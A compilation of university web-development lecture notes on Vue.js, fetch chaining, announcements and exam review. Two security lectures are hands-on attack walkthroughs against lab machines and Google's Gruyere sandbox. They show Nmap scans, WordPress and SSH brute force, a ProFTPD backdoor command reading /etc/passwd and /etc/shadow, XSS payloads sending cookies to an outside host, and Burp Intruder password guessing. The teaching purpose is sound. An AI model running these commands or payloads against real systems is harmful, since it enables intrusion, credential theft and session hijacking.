* [AlexaSkills/IntentRequest.json](AlexaSkills/IntentRequest.json)
* [AlexaSkills/LaunchRequest.json]()



----------------------------------------------------------------------------
# Interactivity and Vue

Today we made my TODO list more interactive.  I encourage you to play with the
code in the [attached file](todo.html) as you learn how to use Vue.


As with vanilla HTML, you may write in-line JavaScript code within an onclick
attribute.  To make this code Vue-aware, prepend `v-on:` to the name of the
event you wish to listen for.

As a shorthand, you may write `v-on:click` as `@click`

* [@click shorthand syntax](https://vuejs.org/v2/guide/syntax.html#v-on-Shorthand)



## Where may I put executable code within my Vue object?

Define functions within the `methods` property of the Vue configuration object.


* [Vue API guide: Methods](https://vuejs.org/v2/api/#methods)
* [Listening to click events](https://vuejs.org/v2/guide/events.html#Methods-in-Inline-Handlers)


## Associating a DOM element with an element of a JavaScript Array

I used a special form of Vue's `v-for` loop to get access to the *index* of
each item in my `todos` array, along with the item itself.  Today's demo code
demonstrates my using the array index as part of the content of the list
(template) as well as inserting the data into each `li` element by way of a
custom HTML attribute which is prefixed with `data-`.

* [Using data attributes](https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes)

I used Vue's `v-bind` directive to create a new attribute at runtime, and
populate it with computed data.

See this module's [Readings and Resources](../Readings-and-resources.md) for
guidance about using `v-bind` in your project.


----------------------------------------------------------------------------
# Lifecycle hooks: Arrange to fetch data from an API at the right time

In Assignment 5 you automatically fetched data from Quandl's API as your app
was loading.  Vue gives you control over when certain things happen in your app
with respect to its initialization process.

* [Lifecycle Diagram](https://vuejs.org/v2/guide/instance.html#Lifecycle-Diagram)

You can arrange for the IP address geolocation API call and the call to
OpenWeatherMap's API to occur as your Vue application is being created by the
browser by putting this code into a property of the Vue configuration object
called `created()`.

    new Vue({
        created () {
            ...
        },
    });


Lecture 33: Module6/Apr_05/notes.md
================================================================

# CS2610 - Fri Apr 05 - Module 6


# Topics:

* Your Recipe for Assn 6
* Computed Properties
* Chaining Promises


----------------------------------------------------------------------------
# Your Recipe for Assn 6

1. Get your own API keys from both services
2. Test a URL in browser to fetch your IP addr's own geolocation data from ipstack
3. Write JavaScript to perform this fetch
4. Test a URL in browser to look up your 5-day/3-hour weather forecast based
   upon the latitude & longitude found in the previous step
5. Write JavaScript to perform this fetch
6. Tie this all together around a simple webpage which displays these results
7. Vue-ify it


## Vue crash course video

It is well worth your time to watch and follow along with this video.  You may
find it on the Vue.js guide:

* [Vue Guide](https://vuejs.org/v2/guide/)





----------------------------------------------------------------------------
# Computed Properties

While you can put rather complex JavaScript expressions within Vue's template
brackets `{{`, `}}`, it is not considered good practice to do so.

Computed Properties offer a better place to put your complex (and reusable) code.

../Readings-and-resources.md#markdown-header-computed-properties

See the [code example](todo.html)



----------------------------------------------------------------------------
# Chaining Promises

Return a call to `fetch()` from within a `.then()` continuation to chain
dependent requests linearly instead of nesting/indenting deeper.


See the example in the directory charactersheet/.  Instructions for installing
this Django app into your own Django project are found in the
[README file](charactersheet/README).


Lecture 34: Module7/Apr_08/notes.md
================================================================

# CS2610 - Mon Apr 08 - Module 7

# Announcements

============================================================================
# Call on 3 designated questioners
============================================================================

# Topics:

* Assignment 7 - Hack This Site!
* Computer Security Threats in $CURRENT_YEAR
* Computer Security Concepts
* Getting Started With Computer Security


----------------------------------------------------------------------------
# Assignment 7 - Hack This Site!


----------------------------------------------------------------------------
# Computer Security Threats in $CURRENT_YEAR

[A slideshow, I'm sorry](CyberSecReport.odp).  It's the only one I'll do.
I promise.



----------------------------------------------------------------------------
# Computer Security Concepts

How do I get started [in cybersecurity?](../Readings-and-resources.md)


Lecture 35: Module7/Apr_10/notes.md
================================================================

# CS2610 - Wed Apr 10 - Module 7

# Announcements

## US Cyber Challenge Quests open until April 14th

We're in the middle of the 2019 CyberQuests competition and the new season has
been fierce. As of now, the top 5 states of competitors are 

1. Delaware
2. Illinois
3. Hawaii
4. California
5. Virginia

But there is still another week before the competition ends. You can make the
difference. How will you fare in the nation?  This is the link to the
competition for your convenience:

* https://uscc.cyberquests.org/

We keep up-to-date information on our social media so feel free to share our
posts and information relevant to the competition:

* Facebook: https://www.facebook.com/USCyberChallenge/
* Twitter: https://twitter.com/USCybChallenge


## FSLC Meeting Tonight

Tour of Open Source Software Licenses

7pm @ ESLC 053



## Computer Science Department Spring Social and Awards Dinner

Next Tuesday, 4/16 5–7 pm @ West Stadium Center

* Free Dinner - Taco Bar & Drinks from The Italian Place
* Prizes
* The RSVP list is full!  Contact cora.price@usu.edu to get on the wait list.



## FSLC Closing Social

* Come relax and de-stress before finals week sucks the fun out of life
* Pizza will be provided
* Next Wednesday, 4/17 7pm @ ESLC 053


## On-Campus Capture The Flag Event

Thursday, April 18th in HH 220. Please bring your laptop.



## Park City High School "Girls in Tech" Club Hackathon needs mentors

16 mentors are needed on April 27 (the Saturday in the middle of Finals Week)
to mentor a group as they complete a project for the competition. We have tons
of funding and will be giving away prizes to the winning groups at the end of
the event, including the mentor. We are looking for USU computer science
students with experience in App Inventor/Thunkable and/or Android Studio.

The event will be at Park City High School and we are having the mentors stick
with their teams all day and so the commitment would be around 11 hours as our
mentoring begins around 10:00.

[Sign up link](https://forms.gle/BFjx8VnfcqRMUAN78)



# Topics:

* Do try this at home (and only at home)
* Exploitation Step 1: Enumeration with Nmap "The Network Mapper"
* Exploitation Step 2: Launch an automated attack
* Exploitation Step 3: Sneak in through the back door
* Other Brute Force attacks




----------------------------------------------------------------------------
# Do try this at home (and only at home)

What I will show you today could get you into *serious* trouble (the orange
jumpsuit kind) if you do it to a computer system that you aren't permitted to
do these things to.

Don't be scared.  Be smart and use good judgement.

The ../Readings-and-resources.md for this module suggest many helpful things to
read and resources to use to get started learning about security.  Build a
security lab at your home and hack into that.



----------------------------------------------------------------------------
# Exploitation Step 1: Enumeration with Nmap "The Network Mapper"

* [Nmap homepage](https://nmap.org/)

To paraphrase the Nmap documentation:

> Nmap ("Network Mapper") is an open source tool for network exploration and
> security auditing.  Nmap determines what hosts are available on the network,
> what services those hosts are offering, what operating systems they are
> running, etc.  While Nmap is commonly used for security audits, many systems
> and network administrators find it useful for routine tasks such as network
> inventory, managing service upgrade schedules, and monitoring host or service
> uptime.


## Using Nmap from the command line

The syntax of the Nmap tool is simple.

    nmap [Scan Type...] [Options] {target specification}

Remember that when command line syntax is explained, square brackets indicate
optional parameters.  In this case, both `Scan Type` and `Options` are actually
optional.  The trick to Nmap is learning what all of the Scan Types and
Options are.  We'll walk through a few in a moment, but let's first learn what
`target specification` means.


## Identify your target IP address/network

Today we are targeting a virtual machine specially prepared with a few
[insecure web services](http://bit.ly/insecsrvr).  I already know that it's
connected to my computer via the 192.168.56.0/24 network, but even if I didn't,
I could still use Nmap to track it down for me (though this could take a
while).


*Be careful with Nmap!  The USU NOC can tell when people are scanning our network.
If it's you doing the scanning, yes, they know your IP address.*

Let's ask Nmap what systems are live on this network in
CIDR notation:

    nmap 192.168.56.0/24


The first result, 192.168.56.1, is my own laptop, so we'll ignore it.  Besides
my laptop, there are 5 other IP addresses which Nmap identified as hosting
network services.

    1. 192.168.56.16
    2. 192.168.56.17
    3. 192.168.56.18
    4. 192.168.56.19
    5. 192.168.56.20

From Nmap's output we can see the port numbers that were detected.  We
already recognize a few of these ports from our discussion a few weeks ago: SSH
servers, FTP and web servers hosting both HTTP and HTTPS services.  Nmap also
gives us a few hints for some others, such as the MySQL service apparently
running on 192.168.56.18 port 3306.  This is just a guess based upon the fact
that port 3306 is commonly used by MySQL.

Let's focus on these 5 IP addresses and see what more information Nmap can dig
up for us.  We'll refine our `target specification` to `192.168.56.16-20` to
save time.  We will also ask Nmap to perform a deeper scan to discover exactly
what services are running on those ports, and what versions of software are
behind them.

    nmap -sV 192.168.56.16-20

It turns out that the machine `192.168.56.18` actually is running MySQL!  But
Nmap wasn't able to log in to poke around more.  This is a big find because
MySQL isn't the sort of thing that should be exposed to the outside world like
this.  A few of the machines are running web servers.  Let's visit them and see
what their homepages offer.

One of them, `192.168.56.16`, is hosting a WordPress site!  WordPress is a very
common Content Management System built with the PHP language.  It is also
notorious for having all sorts of security flaws due to its under-regulated
plugin system.


## The moral of this story

Protect sensitive resources from being accessible outside of an appropriate
boundary.


----------------------------------------------------------------------------
# Exploitation Step 2: Launch an automated attack

Let's take an even deeper look at the machine running WordPress:

    nmap -A 192.168.56.16

Nmap even grabbed the text within the `title` HTML element of the main page.

It's kinda creepy how much information is so readily available to somebody with
Open Source Software and a few minutes to experiment with it.

Well, if you think that's creepy, you haven't seen anything yet!  Let's ask
Nmap to run a script that will spider its way across the website, looking for
more webpages we might attack.

    nmap -sV --script http-enum 192.168.56.16

Well, that turned up a few interesting tidbits.  Among other things, we found a
couple of login pages.  I wonder if this site admin changed the password after
installing?  Or did the admin pick a weak password?

There's a script for that!  Nmap has a handy option called `--script-help`
which dumps documentation for all installed scripts.  You can filter the list
by giving `--script-help` a pattern to match against.  I can look for all
WordPress related scripts with

    nmap --script-help '*wordpress*'

The script named `http-wordpress-brute` sounds appropriate.

Next, we need a dictionary of passwords for Nmap to try.  Daniel Miessler has
a few [password lists](https://github.com/danielmiessler/SecLists).  But I
think so poorly of this sysadmin that I'm willing to bet that the password is
one of the top 512 passwords revealed when RockYou.com was [hacked in 2009](
https://www.ghacks.net/2010/01/21/rockyou-hacked-some-30-million-passwords-in-the-wild-security/).

I have that dictionary in a file called `rockyou_top512.txt`.  Let's hand it over
to Nmap's WordPress BruteForce login script and see what happens:

    nmap -sV --script=http-wordpress-brute --script-args=passdb=rockyou_top512.txt 192.168.56.16


## The moral of this story

Use care when choosing authentication credentials; choose a password that's
*not* in a well-known cracker dictionary.


----------------------------------------------------------------------------
# Exploitation Step 3: Sneak in through the back door

When we ran the in-depth service scan above, I noticed an **old** version of an
FTP server running on one of the boxes:

    nmap -sV 192.168.56.16-20

Doesn't anybody patch their systems anymore?

On `192.168.56.19` there is a version of ProFTPD which seems familiar to me for
some reason...  Let's see if Nmap knows anything about ProFTPD.

    nmap --script-help '*proftpd*'
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-09 23:09 MDT

    ftp-proftpd-backdoor
    Categories: exploit intrusive malware vuln
    https://nmap.org/nsedoc/scripts/ftp-proftpd-backdoor.html
      Tests for the presence of the ProFTPD 1.3.3c backdoor


Oh yes, let's try that!  We'll try the backdoor and attempt to run the `id`
program, which will tell us both whether the backdoor is indeed present, and if
so, it will tell us whether we have administrator access to the system.

    nmap -sV --script ftp-proftpd-backdoor 192.168.56.19

In addition to running an out-of-date and known-broken version of ProFTPD, this
sysadmin is also running it as the root user!  We can do anything we like on
this system.

I wonder what user accounts are active.  Let's check the password and shadow files:

    nmap -sV --script ftp-proftpd-backdoor --script-args="cmd=cat /etc/passwd" 192.168.56.19

    nmap -sV --script ftp-proftpd-backdoor --script-args="cmd=cat /etc/shadow" 192.168.56.19

## The moral of this story

Be aware of what services you are using and stay on top of security alerts.
Update your software so you aren't vulnerable to known attacks that Script
Kiddies can pull off.



----------------------------------------------------------------------------
# Other Brute Force attacks

## Brute Force SSH with Hydra 
According to the file `/etc/shadow` on `192.168.56.19` the account called
`user` has a password.  We could try an offline attack and crack that hash on
our own computer.  But this sysadmin is known to use poor passwords on other
systems; it's not much of a stretch to think this is the case here as well.
Let's try brute-forcing the `user` account via ssh (which Nmap reported is
running on this server) with another automated tool called
[Hydra](https://github.com/vanhauser-thc/thc-hydra):

    hydra -l user -P rockyou_top512.txt 192.168.56.19 ssh



Lecture 36: Module7/Apr_15/notes.md
================================================================

# CS2610 - Mon Apr 15 - Module 7

# Announcements

## Computer Science Department Spring Social and Awards Dinner
Tomorrow, 4/16 5–7 pm @ West Stadium Center

* Free Dinner - Taco Bar & Drinks from The Italian Place
* Prizes
* The RSVP list is full!  Contact cora.price@usu.edu to get on the wait list.



## FSLC Closing Social
* Come relax and de-stress before finals week sucks the fun out of life
* Pizza will be provided
* Wednesday, 4/17 7pm @ ESLC 053



# Topics:

* Mudcard and SSH vulnerabilities
* OWASP Top Ten Project
* Learn to attack a real-life webapp with a pretend webapp
* Can XSS happen on Django?
* Break into Django with BurpSuite



--------------------------------------------------------------------------------
# Mudcard and SSH vulnerabilities

Take a minute and answer the following questions on your mudcards

`mudcard()`

Last month when we learned about SSH, I got a few mudcard questions related to
SSH security.

> Does SSH have any weaknesses?

SSH is software, so yes, it has weaknesses.  Find out what the known ones are
by searching the CVE database:

* [CVE's for OpenSSH](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=openssh)


> I want to know how to set up my own secure server at home, how can I learn
> more about that?

Let me demonstrate what some of the pitfalls are by showing you the SSH log
of my Raspberry Pi at home.


### Three truths you must embrace

1. Life is risk
2. Everything is vulnerable
3. Attacks happen all the time


### If you accept the risks...

1. Ask yourself if you *really* need to run a service.  The more software you
   expose to the internet, the more vulnerable you are.
2. Read all of the documentation and follow best security practices
3. Decide how this software will fit in with your existing systems
4. Follow the vendor's news and apply patches at your earliest convenience



--------------------------------------------------------------------------------
# OWASP Top Ten Project

The OWASP Top 10 is based on data submissions from firms that specialize in
application security and an INDUSTRY survey.  This data spans vulnerabilities
gathered from hundreds of organizations and over 100,000 real-world
applications and APIs.  The Top 10 items are selected and prioritized according
to this prevalence data, in combination with consensus estimates of
exploitability, detectability, and impact.

A primary aim of the OWASP Top 10 is to educate developers, designers,
architects, managers, and organizations about the consequences of the most
common and most important web application security weaknesses. The Top 10
provides basic techniques to protect against these high risk problem areas, and
provides guidance on where to go from here.

* [OWASP Top Ten 2017](https://www.owasp.org/index.php/Top_10-2017_Top_10)


The #1 exploit since 2007 has been injection attacks.  Today you'll see how to
inject malicious JavaScript code into somebody else's webpage.

#### Cross-Site Scripting (XSS)
A vulnerability that permits an attacker to inject JavaScript code into the
contents of a website not under the attacker's control.  When other users visit
this site their browsers now run the attacker's code.

A better name for this exploit would have been "JavaScript Injection".


#### Reflected Cross-Site Scripting
Idem, but the embedded JavaScript code is delivered via a specially-crafted
URL.  This attack relies on you getting a victim to click on a link which
causes either the server or the browser to do something risky.


--------------------------------------------------------------------------------
# Learn to attack a real-life webapp with a pretend webapp

There are lots of excellent web-based resources to learn how to do code
injections.  I like Google's Gruyere Codelab because it's simple, Open Source,
and includes excellent documentation to help you come up to speed quickly.

We'll visit [Gruyere](https://google-gruyere.appspot.com/) and set up our own
little sandboxed app.  We'll explore the site and see if we come across
anything that raises red flags.


## Let's see if we can inject these JavaScript commands into Google Gruyere

    // Steal the user's cookies
    alert(document.cookie)

    // Annoy the user
    history.back()

    // A good ol' RickRoll
    window.open("https://www.youtube.com/watch?v=yErnuebA9Yo&start=22")



## Stored XSS

This exploit is to put a `script` tag on a page such that other users visiting
the site will run our code.  Gruyere lets users post "snippets" with support
for "limited HTML".  Let's find out what they mean by "*limited*".

### Stored XSS in a Snippet

+ "Sign up" for a new account
+ "New Snippet"
+ Input this text into the `textarea`:

    <a onmouseover="alert('I stole your cookies ' + document.cookie)" href="#">Click me to win</a>

**Remediation**:  Sanitize user input.  Don't allow users to input HTML.


### Stored XSS in an HTML attribute

Gruyere lets users customize their profile by picking a color to present their
username.  I wonder how this works?

+ Click "Profile" at the top of the page
+ Enter `orange` as the Profile Color and "Update"
+ Use "View Source" to see how the color is set on the user name; it's applied
  on the `style` attribute of a `span` tag, and surrounded with single quotes.
+ Return to "Profile" and enter this as your color:
    magenta' onmouseover='history.back()

*Question*: Is this exploit preventable by giving users an `input` where `type="color"`?

**Remediation**: Sanitize any user-provided text which may appear within an HTML attribute.


### Stored XSS via AJAX

Visit https://google-gruyere.appspot.com/375075502316416254854345754740496557792/feed.gtl
  and view source.  Does anything stand out to us here?

+ "New Snippet"
+ Input this text into the `textarea`:

    Never gonna<span style=display:none>" + window.open('https://www.youtube.com/watch?v=yErnuebA9Yo&start=22') + "</span> let you down

+ Return to the Gruyere Home page
+ Click the "Refresh" link

**Remediation**: Sanitize user-provided text both on the server-side (before
it's stored to a database) and on the client-side.  Don't use the `eval()`
function, because it can do *anything*


### Stored XSS in a username

Can we put a `script` tag into a user account?

+ Sign Out
+ Sign Up
+ Enter a `script` tag and code into the "User name" field

At first glance it seems that we cannot do this because the maximum length for
a username is too short to admit any useful code.  But is this limit a **hard**
limit?  Is this limit enforced on the *back-end* as well as on the *front-end*?

+ Open the Inspector and locate the User name `input` element
+ Remove the `maxlength` attribute
+ Enter one of our snippets from above wrapped in `script` tags

**Remediation**: Validate and sanitize data on the back-end.  After all, the
computer on the back-end is the only computer over which you have any control.



## Reflected XSS

Recall that reflected XSS is when we encode instructions into a URL.  This
crafted URL could come to you as a link in a spam email, or it could be
placed on another site waiting for unsuspecting users to click on it.

This attack hinges on the site taking data from the address and incorporating
it into the body of the document somehow.  On an unrelated note, I wonder what
happens when we try to visit a non-existent page on Gruyere?

+ In the URL bar, delete any '#' character and text that may follow it
+ Append something else to the URL, like `1+1 = 2` or `<h2>hello</h2><h1>world</h1>`

Notice that the error message includes whatever junk we put into the URL.
That's a curious thing about the HTML tags being rendered.  I wonder what
happens if we put a `script` tag in there?

    <script>alert(document.cookie)</script>

Instead of annoying the user with a pop-up box which will scare them, let's try
to inject a script which will send them (and their cookie) to a website I
control.  If I can trick people into visiting

    http://unnovative.net/cookie=...

I could collect information that may be used to impersonate them on this site.

+ In the URL bar, append this code to the address
    <script>fetch("http://unnovative.net/cookie="+document.cookie)</script>

+ Open the Network tab and see if the browser makes a request to unnovative.net

Oh good!  By some combination of the browser and this site, I cannot simply use
the `fetch()` API to surreptitiously steal their session cookie.  It's a
*really* good thing that there are absolutely no other ways to make a browser
perform a GET request.

    <script>i=new Image();i.src="http://unnovative.net/cookie="+document.cookie</script>


Oh, forgot about that one...

+ Open a private tab and visit the base Gruyere URL for my instance
+ Open the JavaScript console and enter `document.cookie = ''` and paste the
  session cookie from my server log on unnovative.net into the quotes
+ Refresh the page in the private session

**Remediation**: Sanitize *all* user input that appears on the page.
This extends even to the address; it comes from the user.



--------------------------------------------------------------------------------
# Can XSS happen on Django?

Does XSS work against the Django blog you created in Assignment 3?  Recall that
your Django blog accepts input from users in the form of comments to blog
posts.

Try these techniques on your own blog assignment and see if it's vulnerable!

Let's fire up a blog and see what we can get away with in the comment section


    hi &lt;h1&gt;there &lt;/h1&gt;

    hi <span onmouseover="alert('yo mamma hovers!')">there</span>


Django template variables automatically have sensitive HTML chars escaped:
https://docs.djangoproject.com/en/2.0/ref/templates/language/#automatic-html-escaping

By default in Django, every template automatically escapes the output of
every variable tag. Specifically, these five characters are escaped:

* < is converted to &lt;
* > is converted to &gt;
* ' (single quote) is converted to &#39;
* " (double quote) is converted to &quot;
* & is converted to &amp;

To make XSS work in Django, you must disable `autoescape` by wrapping the
relevant portion of the template in these tags:
    {% autoescape off %}
    {% endautoescape %}

Since you would have to go out of your way to do this, your blog is already
protected against XSS :)



--------------------------------------------------------------------------------
# Break into Django with [BurpSuite](https://portswigger.net/burp/)

Burp is like an IDE for breaking web applications.

It operates as an HTTP proxy, sitting between your browser and a web server.
From this vantage point it can inspect and manipulate traffic going in both
directions.

On [Wednesday, April 10th](../Apr_10/notes.md) we saw how to use a brute force
script with Nmap to break into a WordPress site with a weak password.  Right at
the end of class I also demonstrated using a tool called Hydra to brute force
our way into an SSH server with a weak password.  The authentication used by
your Django admin page is rather sophisticated, and gives these tools a hard
time.  Let's apply the Burp tool to the problem and see how it fares.




#### Cracking into Django Admin with Burp Suite Community + password list

Get [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)

This is terribly slow in the Community edition; it does about 1 req. per sec.
But it does work!

I followed along with the instructions presented in this
[YouTube video](https://www.youtube.com/watch?v=EC9BI7SLo9Y).  The most
important difference is that I knew that I was targeting the 'admin' account,
so I applied the dictionary only to the password field.

1. `python manage.py createsuperuser admin`
   Create a truly stupid password, something that's in the top 20 of a password
   list since this process is terribly slow.  You have to set a weak password
   at the time of user creation because the `changepassword` tool doesn't let
   you set a weak password later on.

2. Fire up Burp Suite, add `http://localhost:8000` to scope

3. Enable interception

4. In Firefox goto `about:preferences`, enable basic manual proxy for `localhost` and `8080`

5. Visit `http://localhost:8000/admin` in FF, intercept a login request with
   bogus creds, and send to "Intruder"

6. In the "Intruder" tool, clear all selections, then select the password part
   of the request

7. Choose a wordlist for field 1, and use the `rockyou_top512.txt` password
   file

8. "Start Attack"

9. Watch for one request that differs from the others - the correct password
   results in a HTTP 302 redirect to /admin/ and has a different response length.


Lecture 37: Module7/Apr_17/notes.md
================================================================

# CS2610 - Wed Apr 17 - Module 7

# Announcements

## FSLC Closing Social
* Come relax and de-stress before finals week sucks the fun out of life
* Pizza will be provided
* Wednesday, 4/17 7pm @ ESLC 053



## Reminder: Please take the IDEA survey

Big thanks to those who have already left their feedback!



--------------------------------------------------------------------------------
# Guest Lecture by Skyler Cain of Rent Dynamics

See [his slides](APIs For The Real World.pptx) to learn how his company uses
Django to build the APIs that enable their business to handle everything from
communications to propery management.


Skyler also graciously offered to give you a tour of Rent Dynamics to get a
first-hand taste of a Software Development company.  Guys, this is a really
neat offer, and I hope that many of you take him up on it.  Heck, I might even
drop in over this winter break.


Here's how to get in touch with Skyler:

Skyler Cain <skyler@rentdynamics.com>


## How do I get into all of these different frameworks?

Just try them out - spin up a small project in a framework to find out if you
like it.  Just get a little taste of the possibilities.  Try out different
languages the same way, write a small project and see if it feels good.

Take a project that you've already completed in one language/framework, and
translate that.  You'll know what the end result should look like and you won't
feel lost, and it will give you a good perspective on the relative
strengths/weaknesses between them.


Lecture 38: Module7/Apr_19/notes.md
================================================================

# CS2610 - Fri Apr 19 - Module 7

# Announcements

## Tutor Lab End of Semester Schedule

The tutor lab will close for the semester at the end of the day on Tuesday the
23rd, which is the last day of classes.



# Guest Lecture by James and John Pope of [Pope Tech](https://pope.tech/)

[Slides](https://bit.ly/2IuqxnM)


[70 sites which offer free challenges for hackers to practice their skills](http://www.blackroomsec.com/updated-hacking-challenge-site-links/)


Lecture 39: Module7/Apr_22/notes.md
================================================================

# CS2610 - Mon Apr 22 - Module 7

# Announcements


## Engineering State Assistants Needed

Engineering State is a fun-filled 4-day summer camp for students entering their
senior year of high school. Participants explore how engineering has changed
our world and learn what earning a degree in engineering is all about. Many of
our graduates have majored in engineering and now have successful, fulfilling
careers.

    https://engineering.usu.edu/events/e-state/


I am running two Challenge Sessions at Engineering State this summer: one is an
intro to Python and programming, and the other is a Virtual Reality experience.
I need two assistants who will be available to be on campus in the daytime
from June 3rd through the 5th (Monday - Wednesday), and who meet these
requirements:

* Know at least a little bit of Python
* Good communicators with upbeat, positive personalities
* Excited to work with teenagers
* Know how to party like a multi-tape Turing Machine!



## Reminder: Please take the IDEA survey

Big thanks to those who have already left their feedback!



# Topics:
* Making a career in cybersecurity
* Website coding projects to work on over the summer
* Final Exam Review


--------------------------------------------------------------------------------
# Making a career in cybersecurity

When speaking to James and John Pope after a guest lecture last semester, it
came up that many organizations are facing a severe shortage of cybersecurity
personnel.

Entry level wages are ~$60k, and this can go up as high as ~$120k with a few
years' experience.  

If you can pass a background test and a drug test, you could get a job with the
FBI today (A person who hires for the federal government told James that he
really likes to hire Utahans because they tend to not have problems passing
these sorts of tests).

Notice that no mention of skills, training, or degrees is mentioned here.
The most important qualification (after passing the tests) is merely having an
*interest* in cybersecurity.

The jobs are out there.  Put on your black hoodie and go get 'em!


--------------------------------------------------------------------------------
# Website coding projects to work on over the summer

Here are some ideas for projects you can work on over the summer to keep your
web-dev skills sharp:

* Set up a Raspberry Pi webserver.
    - Learn how to use real-life production webservers such Apache or Nginx
    - Configure Port Forwarding on your home router to make it visible to the 'net
    - Get a free domain name from https://www.dot.tk and configure your own DNS

* Forum in Django
    - It's a lot like a blog - you can use that code as a starting point

* Django URL shortener
    - There are some good tutorial videos on YouTube about this

* Django Pastebin
    - There are a billion of these on the 'net, so why not make your own?

* Django self-destructing notes service 
    - A cross between a URL shortener and a pastebin
    - Creates a webpage with a messagae which can be visited only once; after
      the first visit, the secret note is deleted
    - The Ur-example is at https://secrets.xmission.com/
    - Bonus points if you can encrypt the message in the browser so that your
      server *never* has access to the actual message!

* Explore other frameworks/languages
    + Try [Flask](http://flask.pocoo.org/), another Python web framework 
        - Translate some of your Django assignments into Flask to learn the
          differences and relative strengths/weaknesses between the two
    + Popular alternatives to Vue.js are Angular and React


Above all, stay curious this summer!



--------------------------------------------------------------------------------
# Final Exam Review

* 50 questions in total - 130 points
* Cumulative across the entire semester
* The exam is available in the Testing Center all week long


# HTML/CSS

* What is the purpose of HTML, and what problem does it solve?

* What is the `form` element for
    - What is the `action` attribute for?
    - What is the `method` attribute for?
    - How are data within the form presented to the server?

* How does the `onclick` HTML attribute work?
    - The programmer specifies JavaScript code as the value of this attribute
    - The keyword `this` refers to the DOM element on which this attribute is applied
    - It may be applied to any visible DOM element to make it respond to clicks


* What is the purpose of CSS, and what problem does it solve?
    - In the absence of a CSS stylesheet, which appears larger, text within `h1` or text within `h4`?
    - In the absence of a CSS stylesheet, what does a `div` look like?

* Simple CSS selectors
    - #ID selectors
    - .class selectors
    - element selectors



# Django

* What is a Django Project?
    - How does one create a new Django project?

* What is a Django App?

*   Which Django file is responsible for...
    - The code which runs when a user wants to see a page (VIEW) = `views.py`
    - Mapping a URL to a view function (CONTROLLER, aka receptionist) = `urls.py`
    - Defining classes which represent database records (MODEL) = `models.py`
    - Contains configuration information for my project = `settings.py`

*   Django templates
    -   Use the `render()` function to render a template
    -   A Django context object is a Python dictionary
    -   Django template variables are surrounded by double curly braces {{ }}
    -   Django template tags are surrounded by curly braces like this: {% %}


* After successfully handling a POST request, best-practices dictate that your
  response to the user should Redirect the user to another URL so that they
  cannot accidentally re-POST



# JavaScript

* What problem was JavaScript created to solve?

* JavaScript is a dynamically typed language, and features automatic type
  conversion

* Be prepared to run some JavaScript code in the Console and explain the
  results (Do this in a separate tab so as to not accidentaly break your Canvas
  test)

* The `fetch()` function returns Promise objects
    - Promises are resolved by calling their `.then()` method.

* The big difference between **arrow** and **regular** functions is that
  **arrow** functions are not passed an implicit `this` or `arguments` object

* APIs primarily intended to be used by other programs

* What sorts of HTTP requests can you use on an API? 

* Why do modern web applications take advantage of APIs?

* What must you know in order to use an API? 



# Domain Name System and Port numbers

* Communication between two computers across a network requires two pieces of
  information:
    - IP address
    - Port number

* A port number identifies a service on a machine

* The Domain Name System (DNS) is essentially a database mapping hostnames to
  IP addresses

* The Secure Shell (SSH) is primarily concerned with the task of remote web
  server administration
    - SSH replaces older protocols such as Telnet and RSH because they are insecure



# Vue.js

* What are the properties of the object passed to the `Vue()` constructor, and what do they do?
    - data 
    - el
    - methods
    - created()

* What do the `v-if` and `v-else` directives do?

* How does the `v-for` directive work?



# Security

* What are Black Hat and White Hat hackers?

* What are Black and White box hacking?

* What are Red and Blue teams?

* What is XSS?
    - Cross-Site Scripting
    - Injecting code directly into another site

* What is Reflected XSS?
    - Inject code into a URL

* Input validation should be handled both on the client side and on the server side
    - Never assume that people will use your application as you intended

* What is your best defense against hackers?
    - It is okay for you to think and dress like a hacker!
